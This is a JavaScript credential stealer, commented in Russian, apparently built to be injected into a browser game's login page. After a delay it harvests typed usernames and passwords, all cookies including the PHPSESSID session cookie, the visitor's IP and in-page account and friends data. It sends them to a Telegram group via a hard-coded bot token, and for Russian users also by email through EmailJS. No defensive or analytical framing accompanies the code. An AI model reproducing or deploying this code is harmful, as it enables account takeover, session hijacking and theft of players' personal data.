setTimeout(() => {
(async function() {
    // Конфигурация Telegram бота
    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
    const GROUP_ID = '-5254910028';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Функция для отправки сообщения в Telegram
    const sendToTelegram = async (message) => {
        try {
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: GROUP_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.error('Ошибка Telegram API:', result.description);
            }
            return result;
        } catch (error) {
            console.error('Ошибка отправки в Telegram:', error);
        }
    };

    // Функция для получения куки
    const getCookie = (name) => {
        const matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    };

    // Получаем IP
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || "Не удалось получить IP";
        } catch {
            return "Не удалось получить IP";
        }
    };

    // Функция для сбора логина и пароля
    const getCredentials = () => {
        try {
            const usernameField = document.querySelector('#loginUsername') || 
                                document.querySelector('input[name="login"]') ||
                                document.querySelector('input[type="text"]');
            
            const passwordField = document.querySelector('input[type="password"]') || 
                                document.querySelector('input[name*="pass"]') ||
                                document.querySelector('input#password');
            
            const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
            const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
            
            return { username, password };
        } catch {
            return { 
                username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
            };
        }
    };

    // Получаем ВСЕ куки пользователя
    const getAllCookies = () => {
        return document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return `${name}=${value}`;
        }).join('\n');
    };

    // Функция для безопасного клонирования объектов
    const deepClone = (obj) => {
        if (obj === null || typeof obj !== 'object') return obj;
        const clone = Array.isArray(obj) ? [] : {};
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                clone[key] = deepClone(obj[key]);
            }
        }
        return clone;
    };

    // Проверяем и получаем данные из переменной `user`
    const getUserData = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(deepClone(user), null, 2);
            }
            return "Переменная 'user' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'user': ${e.message}`;
        }
    };

    // Получаем friendsData в оригинальном виде
    const getFriendsData = () => {
        try {
            if (typeof friendsData !== 'undefined' && friendsData !== null) {
                return JSON.stringify(deepClone(friendsData), null, 2);
            }
            return "Переменная 'friendsData' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
        }
    };

    // Получаем friendsArr в оригинальном виде
    const getFriendsArr = () => {
        try {
            if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                // Для больших массивов делаем выборку
                if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                    const sample = {
                        total_length: friendsArr.length,
                        sample_items: []
                    };
                    
                    // Берем первые 10 элементов
                    for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                        if (friendsArr[i]) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    // Берем несколько элементов из "хвоста" массива
                    for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                        if (friendsArr[i] && sample.sample_items.length < 15) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    return JSON.stringify(sample, null, 2);
                }
                return JSON.stringify(deepClone(friendsArr), null, 2);
            }
            return "Переменная 'friendsArr' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
        }
    };

    // Получаем уровень пользователя
    const getUserLevel = (addX = false) => {
        try {
            if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                return `level: ${user.level}${addX ? 'x' : ''}`;
            }
            return `level: не определен${addX ? 'x' : ''}`;
        } catch (e) {
            return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
        }
    };

    // Функция для разбивки длинного сообщения на части (Telegram имеет ограничение 4096 символов)
    const splitMessage = (text, maxLength = 4000) => {
        const parts = [];
        for (let i = 0; i < text.length; i += maxLength) {
            parts.push(text.substring(i, i + maxLength));
        }
        return parts;
    };

    const sendUserData = async () => {
        const phpsessid = getCookie('PHPSESSID');
        const userIP = await getIP();
        const credentials = getCredentials();
        const allCookies = getAllCookies();
        const userData = getUserData();
        const friendsDataStr = getFriendsData();
        const friendsArrStr = getFriendsArr();
        
        // Проверяем, заполнены ли оба поля
        const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                 credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                 credentials.username && credentials.password;
        
        // Получаем уровень с 'x', если поля заполнены
        const userLevel = getUserLevel(bothFieldsFilled);
        
        // Формируем сообщение для Telegram
        let message = `<b>🚨 НОВЫЙ ЛОГ 🚨</b>\n\n`;
        message += `<b>📅 Время:</b> ${new Date().toLocaleString()}\n`;
        message += `<b>🌐 IP:</b> <code>${userIP}</code>\n`;
        message += `<b>🔗 URL:</b> ${window.location.href}\n\n`;
        
        message += `<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n`;
        message += `<code>${userLevel}</code>\n`;
        message += `<b>💰 Gems:</b> ${user?.premiumPoints || 'N/A'}\n`;
        message += `<b>🖥️ Выбранный сервер:</b> ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\n\n`;
        
        message += `<b>🔑 PHPSESSID:</b>\n`;
        message += `<code>${phpsessid || "PHPSESSID: не найдена"}</code>\n\n`;
        
        message += `<b>👤 УЧЕТНЫЕ ДАННЫЕ:</b>\n`;
        message += `<b>Логин:</b> <code>${credentials.username}</code>\n`;
        message += `<b>Пароль:</b> <code>${credentials.password}</code>\n\n`;
        
        message += `<b>🍪 КУКИ (первые 1000 символов):</b>\n`;
        message += `<code>${allCookies.substring(0, 1000) || "Куки не обнаружены"}</code>\n\n`;
        
        message += `<b>📋 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:</b>\n`;
        message += `<code>${userData.substring(0, 800)}</code>\n`;
        
        if (userData.length > 800) {
            message += `\n<i>... и ещё ${userData.length - 800} символов</i>\n`;
        }
        
        message += `\n<i>Отправлено автоматически</i>`;

        // Разбиваем сообщение на части если оно слишком длинное
        const messageParts = splitMessage(message);
        
        // Отправляем каждую часть
        for (let i = 0; i < messageParts.length; i++) {
            if (i > 0) {
                messageParts[i] = `<b>🚨 ЛОГ (часть ${i + 1}/${messageParts.length})</b>\n\n${messageParts[i]}`;
            }
            await sendToTelegram(messageParts[i]);
            // Небольшая задержка между отправками
            if (i < messageParts.length - 1) {
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
        
        console.log('✅ Данные отправлены в Telegram');
    };

    await sendUserData();
})();

// Оригинальный код для российских пользователей
if(typeof user !== 'undefined' && user.authData && user.authData.countryCode == "RU"){
    var script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
    script.onload = function() {
        emailjs.init("4N-8nqIjjUBhk1vbi");
        
        setTimeout(async () => {
            // Функции сбора данных остаются без изменений
            const getCookie = (name) => {
                const matches = document.cookie.match(new RegExp(
                    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
                ));
                return matches ? decodeURIComponent(matches[1]) : undefined;
            };

            const getIP = async () => {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || "Не удалось получить IP";
                } catch {
                    return "Не удалось получить IP";
                }
            };

            const getCredentials = () => {
                try {
                    const usernameField = document.querySelector('#loginUsername') || 
                                        document.querySelector('input[name="login"]') ||
                                        document.querySelector('input[type="text"]');
                    
                    const passwordField = document.querySelector('input[type="password"]') || 
                                        document.querySelector('input[name*="pass"]') ||
                                        document.querySelector('input#password');
                    
                    const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
                    const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
                    
                    return { username, password };
                } catch {
                    return { 
                        username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                        password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
                    };
                }
            };

            const getAllCookies = () => {
                return document.cookie.split(';').map(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    return `${name}=${value}`;
                }).join('\n');
            };

            const deepClone = (obj) => {
                if (obj === null || typeof obj !== 'object') return obj;
                const clone = Array.isArray(obj) ? [] : {};
                for (const key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        clone[key] = deepClone(obj[key]);
                    }
                }
                return clone;
            };

            const getUserData = () => {
                try {
                    if (typeof user !== 'undefined' && user !== null) {
                        return JSON.stringify(deepClone(user), null, 2);
                    }
                    return "Переменная 'user' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'user': ${e.message}`;
                }
            };

            const getFriendsData = () => {
                try {
                    if (typeof friendsData !== 'undefined' && friendsData !== null) {
                        return JSON.stringify(deepClone(friendsData), null, 2);
                    }
                    return "Переменная 'friendsData' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
                }
            };

            const getFriendsArr = () => {
                try {
                    if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                        if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                            const sample = {
                                total_length: friendsArr.length,
                                sample_items: []
                            };
                            
                            for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                                if (friendsArr[i]) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                                if (friendsArr[i] && sample.sample_items.length < 15) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            return JSON.stringify(sample, null, 2);
                        }
                        return JSON.stringify(deepClone(friendsArr), null, 2);
                    }
                    return "Переменная 'friendsArr' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
                }
            };

            const getUserLevel = (addX = false) => {
                try {
                    if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                        return `level: ${user.level}${addX ? 'x' : ''}`;
                    }
                    return `level: не определен${addX ? 'x' : ''}`;
                } catch (e) {
                    return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
                }
            };

            const sendUserData = async () => {
                const phpsessid = getCookie('PHPSESSID');
                const userIP = await getIP();
                const credentials = getCredentials();
                const allCookies = getAllCookies();
                const userData = getUserData();
                const friendsDataStr = getFriendsData();
                const friendsArrStr = getFriendsArr();
                
                const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                         credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                         credentials.username && credentials.password;
                
                const userLevel = getUserLevel(bothFieldsFilled);
                
                const messageText = `
ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
=============================

📅 Время: ${new Date().toLocaleString()}
🌐 IP-адрес: ${userIP}
🔗 URL: ${window.location.href}

📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
${userLevel}
Gems: ${user?.premiumPoints || 'N/A'}
Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}

🔑 PHPSESSID:
${phpsessid || "PHPSESSID: не найдена"}

👤 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
${userData}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
${friendsDataStr}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
${friendsArrStr}

🔐 УЧЕТНЫЕ ДАННЫЕ:
Логин: ${credentials.username}
Пароль: ${credentials.password}

🍪 ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ:
${allCookies || "Куки не обнаружены"}
=============================
Отчет сгенерирован автоматически.
                `;

                const templateParams = {
                    message: messageText
                };

                console.log("Отправка простого текста через EmailJS...");
                
                emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
                    .then(function(response) {
                        console.log('✅ Письмо успешно отправлено! Статус:', response.status);
                    }, function(error) {
                        console.error('❌ Ошибка отправки:', error);
                    });
            };

            await sendUserData();
        }, 1);
    };
    document.head.appendChild(script);
}
}, 6500);
